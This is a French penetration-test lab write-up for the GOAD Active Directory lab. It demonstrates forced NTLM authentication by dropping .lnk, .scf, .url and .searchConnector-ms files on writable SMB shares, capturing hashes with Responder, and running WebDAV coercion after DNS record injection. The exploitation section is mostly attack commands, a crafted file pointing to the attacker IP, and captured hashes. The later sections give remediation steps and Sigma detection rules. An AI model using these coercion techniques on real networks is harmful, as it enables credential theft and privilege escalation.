# SC-AD-011 — Coerce & Attaques par Fichiers Malveillants

## Classification

| Champ | Valeur |
|-------|--------|
| **Code scénario** | SC-AD-011 |
| **Nom** | Coerce & Attaques par Fichiers — Authentification Forcée via Fichiers Malveillants |
| **Cible** | CASTELBLACK (192.168.10.22) — SRV north.sevenkingdoms.local / BRAAVOS (192.168.10.23) — SRV essos.local |
| **VLAN** | 10 — AD Lab (192.168.10.0/24) |
| **Sévérité** | 🔴 Critique |
| **CVSS 3.1** | 8.1 (AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N) |
| **MITRE ATT&CK** | T1187 (Forced Authentication), T1557 (Adversary-in-the-Middle), T1071.001 (Web Protocols) |
| **Référence Mayfly** | Part 13 — https://mayfly277.github.io/posts/GOADv2-pwning-part13/ |
| **Prérequis** | Compte de domaine avec accès en écriture sur un share SMB (arya.stark:Needle) |
| **Résultat** | Capture de hash NTLMv2 (comptes utilisateur + machine) via coercion SMB et HTTP |
| **Date** | Mars 2026 |
| **Auteur** | Nadyr Chouarhi (hik3nR00t) |

---

## Résumé Exécutif

### Pour un recruteur

Ce scénario démontre cinq techniques de coercion par fichiers qui forcent les utilisateurs Windows à s'authentifier vers un serveur contrôlé par l'attaquant simplement en **visitant un dossier partagé** — sans aucun clic. En déposant des fichiers spécialement conçus (.lnk, .scf, .url, .searchConnector-ms) sur un partage SMB inscriptible, l'attaquant capture des hash NTLMv2 exploitables par cracking offline ou relay. La technique la plus avancée (coercion WebDAV) active le service WebClient sur la machine victime, permettant une authentification HTTP relayable vers LDAP pour l'escalade de privilèges — une technique invisible au monitoring SMB standard.

### Pour un auditeur ISO 27001 / NIS2

- **A.8.2 (Droits d'accès privilégiés)** — Le partage `all` sur CASTELBLACK accorde READ/WRITE à tous les utilisateurs du domaine. Aucun contrôle d'accès ne restreint l'upload de fichiers aux comptes autorisés.
- **A.8.15 (Journalisation)** — Aucun monitoring ne détecte la création de fichiers de coercion (.lnk, .scf, .url, .searchConnector-ms) sur les dossiers partagés. Aucune alerte sur l'activation du service WebClient.
- **A.8.9 (Gestion de la configuration)** — Le service WebClient est installé sur BRAAVOS (Windows Server 2016) sans justification métier. Ce service devrait être désactivé sur tous les serveurs.
- **NIS2 Article 21 §2(d)** — Absence de contrôles sur la chaîne d'approvisionnement : des fichiers malveillants déposés par n'importe quel utilisateur propagent le vol de credentials à travers les frontières de confiance (north.sevenkingdoms.local → essos.local).

### Pour un RSSI

Les attaques de coercion par fichiers ne nécessitent qu'un compte de domaine standard et un partage inscriptible — des conditions présentes dans pratiquement tous les environnements Active Directory. L'attaque est silencieuse (pas de logs, aucune interaction utilisateur au-delà de la visite d'un dossier), scalable (un seul fichier compromet chaque utilisateur qui visite le share) et inter-domaines (un fichier sur CASTELBLACK a coercé khal.drogo depuis essos.local). La variante WebDAV permet des attaques de relay LDAP qui contournent entièrement le SMB signing. La remédiation immédiate nécessite la restriction des accès en écriture sur les partages, la désactivation du WebClient sur les serveurs et le déploiement d'un monitoring d'intégrité des fichiers.

---

## Kill Chain

```
Phase 1 : Reconnaissance
├── Énumération des partages inscriptibles (netexec --shares)
├── Cible identifiée : CASTELBLACK share "all" (READ/WRITE pour tous)
└── Signing identifié : CASTELBLACK (False), BRAAVOS (False)

Phase 2 : Coercion par fichiers (SMB)
├── Technique 1 : fichier .lnk via module slinky → NTLMv2 catelyn.stark
├── Technique 2 : fichier .scf via module scuffy → NTLMv2 catelyn.stark
├── Technique 3 : fichier .url via upload manuel → NTLMv2 catelyn.stark
└── Technique 4 : .searchConnector-ms via drop-sc → NTLMv2 khal.drogo + activation WebClient

Phase 3 : Coercion WebDAV (HTTP)
├── Vérification WebClient actif sur BRAAVOS
├── Ajout enregistrement DNS (dnstool.py) → attacker.north.sevenkingdoms.local
├── Coercion BRAAVOS$ via coercer (HTTP) → NTLMv2 compte machine
└── [Production] Relay HTTP vers LDAP → RBCD / Shadow Credentials

Phase 4 : Nettoyage
├── Suppression de tous les fichiers malveillants des shares
└── Suppression de l'enregistrement DNS
```

---

## Exploitation

### Phase 1 — Reconnaissance

**Énumération des partages inscriptibles sur CASTELBLACK :**

```bash
netexec smb 192.168.10.22 -u arya.stark -p 'Needle' -d north.sevenkingdoms.local --shares
```

```
SMB   192.168.10.22   445   CASTELBLACK   [+] north.sevenkingdoms.local\arya.stark:Needle
SMB   192.168.10.22   445   CASTELBLACK   Share    Permissions   Remark
SMB   192.168.10.22   445   CASTELBLACK   all      READ,WRITE    Basic RW share for all
SMB   192.168.10.22   445   CASTELBLACK   public   READ,WRITE    Basic Read share for all domain users
```

> **Constat :** Deux partages inscriptibles par n'importe quel utilisateur du domaine. Le share `all` est la cible idéale pour la coercion par fichiers.

### Phase 2 — Coercion par fichiers (SMB)

**Préparation :** Responder en écoute en mode verbose pour capturer tous les hash NTLMv2.

```bash
sudo responder -I wg-goad -v
```

> **Astuce :** Utiliser le flag `-v` pour afficher les hash en doublon. Sans ce flag, le cache SQLite de Responder (`Responder.db`) ignore les hash déjà vus. Pour un reset complet : `sudo rm /usr/share/responder/Responder.db /usr/share/responder/logs/*`

**Simulation victime :** Session RDP en tant que catelyn.stark sur WINTERFELL, navigation vers `\\castelblack\all`.

```bash
xfreerdp /d:north.sevenkingdoms.local /u:catelyn.stark /p:robbsansabradonaryarickon /v:192.168.10.11 /cert-ignore
```

#### Technique 1 — Fichier .lnk (slinky)

Un fichier .lnk (raccourci) contient une référence UNC pour son icône. Quand l'Explorateur Windows affiche le contenu du dossier, il tente de résoudre le chemin de l'icône — envoyant le hash NTLMv2 de l'utilisateur vers l'attaquant sans aucun clic.

```bash
netexec smb 192.168.10.22 -u arya.stark -p 'Needle' -d north.sevenkingdoms.local \
  -M slinky -o NAME=desktop.lnk SERVER=10.10.10.2
```

```
SLINKY   192.168.10.22   445   CASTELBLACK   [+] Created LNK file on the all share
```

**Résultat :** Dès que catelyn.stark visite `\\castelblack\all` :

```
[SMB] NTLMv2-SSP Client   : 192.168.10.11
[SMB] NTLMv2-SSP Username : NORTH\catelyn.stark
[SMB] NTLMv2-SSP Hash     : catelyn.stark::NORTH:232552275e17536d:1AE4B6CC320CE642A839908509D6CC04:0101...
```

> **Aucun clic nécessaire.** Le hash est capturé automatiquement dès que la victime entre dans le dossier.

**Nettoyage :**

```bash
netexec smb 192.168.10.22 -u arya.stark -p 'Needle' -d north.sevenkingdoms.local \
  -M slinky -o NAME=desktop.lnk SERVER=10.10.10.2 CLEANUP=true
```

#### Technique 2 — Fichier .scf (scuffy)

Un fichier .scf (Shell Command File) utilise une directive `IconFile` pointant vers un chemin UNC. Windows résout l'icône à l'entrée dans le dossier.

```bash
netexec smb 192.168.10.22 -u arya.stark -p 'Needle' -d north.sevenkingdoms.local \
  -M scuffy -o NAME=desktop.scf SERVER=10.10.10.2
```

```
SCUFFY   192.168.10.22   445   CASTELBLACK   [+] Created SCF file on the all share
```

**Résultat :** Hash NTLMv2 capturé — même comportement que le .lnk, confirmé fonctionnel sur Windows Server 2019.

```
[SMB] NTLMv2-SSP Client   : 192.168.10.11
[SMB] NTLMv2-SSP Username : NORTH\catelyn.stark
[SMB] NTLMv2-SSP Hash     : catelyn.stark::NORTH:...
```

**Nettoyage :**

```bash
netexec smb 192.168.10.22 -u arya.stark -p 'Needle' -d north.sevenkingdoms.local \
  -M scuffy -o NAME=desktop.scf SERVER=10.10.10.2 CLEANUP=true
```

#### Technique 3 — Fichier .url (manuel)

Un fichier .url (raccourci Internet) avec un chemin UNC dans `IconFile` déclenche le même comportement de résolution automatique.

```bash
cat > /tmp/clickme.url << 'EOF'
[InternetShortcut]
URL=http://click.me/pwned
WorkingDirectory=test
IconFile=\\10.10.10.2\%USERNAME%.icon
IconIndex=1
EOF
```

```bash
impacket-smbclient north.sevenkingdoms.local/arya.stark:Needle@192.168.10.22
# use all
# put /tmp/clickme.url
```

**Résultat :** Hash NTLMv2 capturé à la visite du dossier.

```
[SMB] NTLMv2-SSP Client   : 192.168.10.11
[SMB] NTLMv2-SSP Username : NORTH\catelyn.stark
[SMB] NTLMv2-SSP Hash     : catelyn.stark::NORTH:98356f3c6a8fcbf2:F3102A6C003FF2C6BAF5D471FE1331BC:0101...
```

**Nettoyage :**

```bash
impacket-smbclient north.sevenkingdoms.local/arya.stark:Needle@192.168.10.22
# use all
# rm clickme.url
```

#### Technique 4 — .searchConnector-ms (drop-sc)

Un fichier .searchConnector-ms a un double effet : il capture des hash NTLMv2 ET **démarre le service WebClient** sur la machine de la victime. C'est critique car le WebClient permet une authentification HTTP relayable vers LDAP (contrairement au SMB).

```bash
netexec smb 192.168.10.22 -u arya.stark -p 'Needle' -d north.sevenkingdoms.local \
  -M drop-sc -o SHARE=all URL=\\\\10.10.10.2\\share
```

```
DROP-SC   192.168.10.22   445   CASTELBLACK   [+] Created Documents.searchConnector-ms file on the all share
```

**Victime :** khal.drogo (essos.local) connecté en RDP sur BRAAVOS, visite `\\castelblack\all`.

```bash
xfreerdp /d:essos.local /u:khal.drogo /p:horse /v:192.168.10.23 /cert-ignore
```

**Résultat — Capture de hash inter-domaines :**

```
[SMB] NTLMv2-SSP Client   : 192.168.10.23
[SMB] NTLMv2-SSP Username : ESSOS\khal.drogo
[SMB] NTLMv2-SSP Hash     : khal.drogo::ESSOS:0b7618234d43ad72:E4523B1F3C08608E313C6AB5C908172B:0101...
```

> **Impact inter-domaines :** Un fichier sur CASTELBLACK (north.sevenkingdoms.local) a capturé les credentials de khal.drogo (essos.local). Les frontières de confiance ne protègent pas contre la coercion par fichiers.

**Vérification de l'activation du WebClient sur BRAAVOS :**

```bash
netexec smb 192.168.10.23 -u khal.drogo -p 'horse' -d essos.local -M webdav
```

```
WEBDAV   192.168.10.23   445   BRAAVOS   WebClient Service enabled on: 192.168.10.23
```

> **Le WebClient est maintenant actif.** Cela débloque la Phase 3 — coercion HTTP.

### Phase 3 — Coercion WebDAV (HTTP)

Avec le WebClient actif sur BRAAVOS, on peut coercer une authentification HTTP. L'auth HTTP est relayable vers LDAP (contrairement à l'auth SMB), permettant l'escalade de privilèges via RBCD ou Shadow Credentials.

**Étape 1 — Ajout d'un enregistrement DNS pointant vers l'IP de l'attaquant :**

```bash
python3 /opt_test/krbrelayx/dnstool.py \
  -u 'north.sevenkingdoms.local\arya.stark' -p 'Needle' \
  -a add -r 'attacker.north.sevenkingdoms.local' -d 10.10.10.2 192.168.10.11
```

```
[+] LDAP operation completed successfully
```

> **Pourquoi le DNS ?** Le WebClient nécessite un hostname (pas une IP) pour déclencher l'auth HTTP. On ajoute un enregistrement DNS A qui résout vers notre IP attaquant.

**Étape 2 — Coercion de BRAAVOS via HTTP avec coercer :**

```bash
coercer coerce -u arya.stark -p 'Needle' -d north.sevenkingdoms.local \
  -t 192.168.10.23 -l attacker.north.sevenkingdoms.local --always-continue
```

**Résultat — Coercion HTTP + hash compte machine :**

```
[SMB] NTLMv2-SSP Client   : 192.168.10.23
[SMB] NTLMv2-SSP Username : ESSOS\BRAAVOS$
[SMB] NTLMv2-SSP Hash     : BRAAVOS$::ESSOS:cca7d83f3bae651f:6360470EEE219F199F7B4CA7F669F6DA:0101...

[HTTP] Sending NTLM authentication request to 192.168.10.23
[HTTP] Sending NTLM authentication request to 192.168.10.23
[HTTP] Sending NTLM authentication request to 192.168.10.23
```

> **Observation clé :** Les coercions SMB et HTTP sont déclenchées simultanément. Les lignes `[HTTP]` confirment que le WebClient traite les requêtes d'authentification HTTP. Dans une attaque en production, `ntlmrelayx` remplacerait Responder pour relayer l'auth HTTP vers LDAP et réaliser :
> - **Attaque RBCD :** Créer un compte machine → déléguer vers BRAAVOS$ → impersonation Administrator
> - **Shadow Credentials :** Injecter msDS-KeyCredentialLink sur BRAAVOS$ → authentification par certificat
> - **Modification d'ACL :** Ajouter des privilèges à un compte contrôlé

**Nettoyage :**

```bash
netexec smb 192.168.10.22 -u arya.stark -p 'Needle' -d north.sevenkingdoms.local \
  -M drop-sc -o SHARE=all URL=\\\\10.10.10.2\\share CLEANUP=true

python3 /opt_test/krbrelayx/dnstool.py \
  -u 'north.sevenkingdoms.local\arya.stark' -p 'Needle' \
  -a remove -r 'attacker.north.sevenkingdoms.local' -d 10.10.10.2 192.168.10.11
```

---

## Cartographie MITRE ATT&CK

| Technique | Tactique | ID | Description |
|-----------|----------|----|-------------|
| Forced Authentication | Accès aux identifiants | T1187 | Coercion NTLMv2 via fichiers malveillants (.lnk, .scf, .url, .searchConnector-ms) |
| Adversary-in-the-Middle | Accès aux identifiants | T1557 | Capture de hash NTLMv2 via Responder |
| Web Protocols | Commande & Contrôle | T1071.001 | Coercion WebDAV via protocole HTTP |
| System Services | Exécution | T1569.002 | Activation du service WebClient via .searchConnector-ms |
| Account Manipulation | Persistance | T1098 | RBCD/Shadow Credentials via relay LDAP (scénario production) |

---

## Score CVSS 3.1

**Vecteur :** AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N — **Score : 8.1 (Élevé)**

| Métrique | Valeur | Justification |
|----------|--------|---------------|
| Vecteur d'attaque | Réseau | Exploitation distante via partage SMB |
| Complexité d'attaque | Basse | Outils standards, un partage inscriptible suffit |
| Privilèges requis | Bas | N'importe quel utilisateur du domaine avec accès en écriture |
| Interaction utilisateur | Requise | La victime doit visiter le share (aucun clic nécessaire) |
| Confidentialité | Élevée | La capture de hash NTLMv2 permet le cracking offline ou le relay |
| Intégrité | Élevée | Le relay HTTP permet la modification de comptes (RBCD, Shadow Creds) |
| Disponibilité | Aucune | Pas d'interruption de service |

---

## Impact Financier — MediaTech Groupe SA

| Catégorie d'impact | Coût estimé | Base |
|-------------------|-------------|------|
| Réponse à incident | 45 000 € – 90 000 € | Analyse forensique de tous les dossiers partagés + rotation des credentials |
| Interruption d'activité | 30 000 € – 60 000 € | Restrictions d'accès aux partages pendant la remédiation (2-5 jours) |
| Amendes réglementaires (NIS2) | 100 000 € – 500 000 € | Non-conformité aux contrôles d'accès sur les ressources partagées |
| Dommage réputationnel | 50 000 € – 150 000 € | Le vol de credentials inter-domaines démontre une défaillance systémique |
| **Impact total estimé** | **225 000 € – 800 000 €** | |

---

## Analyse Réglementaire

### ISO 27001:2022

| Contrôle | Écart | Risque |
|----------|-------|--------|
| A.8.2 — Droits d'accès privilégiés | Partages inscriptibles accessibles à tous les utilisateurs du domaine | N'importe quel utilisateur peut déposer des fichiers de coercion |
| A.8.9 — Gestion de la configuration | WebClient activé sur les serveurs sans justification métier | Permet les attaques de relay HTTP contournant le SMB signing |
| A.8.15 — Journalisation | Aucune détection de la création de fichiers malveillants sur les partages | Vol de credentials silencieux à grande échelle |
| A.8.16 — Activités de surveillance | Aucun monitoring d'intégrité des fichiers sur les dossiers partagés | Les fichiers de coercion persistent sans détection |

### Directive NIS2

| Article | Exigence | Écart |
|---------|----------|-------|
| Art. 21 §2(a) — Analyse des risques | Permissions d'écriture sur les partages non évaluées en termes de risque | Écriture non restreinte = vecteur de vol de credentials |
| Art. 21 §2(d) — Chaîne d'approvisionnement | La confiance inter-domaines permet le vol de credentials au-delà des frontières | Compromission north → essos via fichier partagé |
| Art. 21 §2(e) — Gestion des vulnérabilités | Service WebClient non durci sur les serveurs | Vecteur d'attaque connu depuis 2022 |

---

## Décisions COMEX

| Priorité | Décision | Investissement | Délai |
|----------|----------|----------------|-------|
| CRITIQUE | Restreindre l'accès en écriture sur tous les dossiers partagés aux groupes autorisés uniquement | 5 000 € (revue GPO) | 0-48h |
| CRITIQUE | Désactiver le service WebClient sur tous les serveurs | 0 € (GPO) | 0-24h |
| ÉLEVÉ | Déployer un monitoring d'intégrité des fichiers (FIM) sur les dossiers partagés | 15 000-30 000 €/an | 1-2 semaines |
| ÉLEVÉ | Activer l'audit SMB avancé (Event ID 5145) sur les serveurs de fichiers | 0 € (GPO) | 1 semaine |
| MOYEN | Imposer le SMB signing sur toutes les machines (pas seulement les DC) | 5 000 € (tests) | 2-4 semaines |
| MOYEN | Segmentation réseau pour empêcher l'accès aux partages inter-VLAN | 20 000-40 000 € | 1-3 mois |

---

## Remédiation

### Immédiat (0-48h)

**Désactiver le WebClient sur tous les serveurs :**

```powershell
# GPO : Configuration ordinateur → Paramètres Windows → Services système
# WebClient → Désactivé
Stop-Service WebClient -Force
Set-Service WebClient -StartupType Disabled
```

**Restreindre l'accès en écriture sur les partages :**

```powershell
# Supprimer l'accès "Tout le monde" et "Utilisateurs du domaine" en écriture
# Remplacer par des groupes de sécurité spécifiques
Revoke-SmbShareAccess -Name "all" -AccountName "Everyone" -Force
Grant-SmbShareAccess -Name "all" -AccountName "NORTH\Share-Writers" -AccessRight Change -Force
```

### Court terme (1-4 semaines)

**Activer l'audit SMB sur les serveurs de fichiers :**

```powershell
# Activer l'audit d'accès aux objets
auditpol /set /subcategory:"Detailed File Share" /success:enable /failure:enable
```

**Déployer une règle Sigma pour la détection des fichiers de coercion :**

```yaml
title: Création de fichier suspect sur un partage SMB
id: f5a8e1c3-7b2d-4e8f-9c3a-1d5e7f2a8b4c
status: experimental
description: Détecte la création de types de fichiers de coercion connus sur les partages SMB
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 5145
        RelativeTargetName|endswith:
            - '.searchConnector-ms'
            - '.scf'
            - '.url'
            - '.lnk'
        AccessMask: '0x2'
    condition: selection
falsepositives:
    - Fichiers raccourcis légitimes créés par les administrateurs
level: high
tags:
    - attack.t1187
    - attack.credential_access
```

### Long terme (1-3 mois)

**Imposer le SMB signing sur toutes les machines :**

```powershell
# GPO : Configuration ordinateur → Stratégies → Paramètres Windows → Paramètres de sécurité
# → Stratégies locales → Options de sécurité
# Serveur réseau Microsoft : Signer numériquement les communications (toujours) → Activé
# Client réseau Microsoft : Signer numériquement les communications (toujours) → Activé
```

**Déployer un monitoring d'intégrité des fichiers (FIM) :**

Surveiller tous les dossiers partagés pour la création de fichiers .lnk, .scf, .url, .searchConnector-ms avec alertes automatisées et mise en quarantaine.

---

## Détection SOC

### Event IDs à surveiller

| Event ID | Source | Description |
|----------|--------|-------------|
| 5145 | Security | Detailed File Share — détecte la création de fichiers sur les partages |
| 7045 | System | Installation de service — détecte le démarrage du WebClient |
| 4697 | Security | Installation de service (audit) |

### Règle Sigma — Activation du service WebClient

```yaml
title: Service WebClient démarré sur un serveur
id: 8c3e1a2b-5d7f-4e9a-b8c2-3f6a7d1e5b9c
status: experimental
description: Détecte l'activation du service WebClient sur Windows Server (ne devrait jamais tourner sur les serveurs)
logsource:
    product: windows
    service: system
detection:
    selection:
        EventID: 7036
        param1: 'WebClient'
        param2: 'running'
    condition: selection
falsepositives:
    - Utilisation légitime de WebDAV (rare sur les serveurs)
level: critical
tags:
    - attack.t1187
    - attack.t1071.001
```

---

## Techniques Alternatives

| Technique | Description | Pourquoi non utilisée ici |
|-----------|-------------|---------------------------|
| ntlmrelayx HTTP → LDAP | Relayer la coercion HTTP vers LDAP pour RBCD/Shadow Credentials | Concept démontré avec Responder ; une attaque en production utiliserait ntlmrelayx |
| Fichier .library-ms | Similaire au .searchConnector-ms, déclenche le WebClient | Le module drop-sc couvre ce cas d'usage |
| Fichier .theme | Fichier thème Windows avec chemin UNC pour l'icône | Nécessite que l'utilisateur applique le thème (plus d'interaction) |
| Détournement RDP | Hijack de sessions RDP déconnectées | Vecteur d'attaque différent, couvert dans d'autres scénarios |

---

## Références

| Référence | URL |
|-----------|-----|
| Mayfly277 GOAD Part 13 | https://mayfly277.github.io/posts/GOADv2-pwning-part13/ |
| Gabriel Prud'homme — Talk Coercion | https://www.youtube.com/watch?v=b0lLxLJKaRs |
| MITRE T1187 | https://attack.mitre.org/techniques/T1187/ |
| Coercer Tool | https://github.com/p0dalirius/Coercer |
| krbrelayx (dnstool.py) | https://github.com/dirkjanm/krbrelayx |
| WebClient Attack | https://www.bitsadmin.com/blog/spooling-printers |
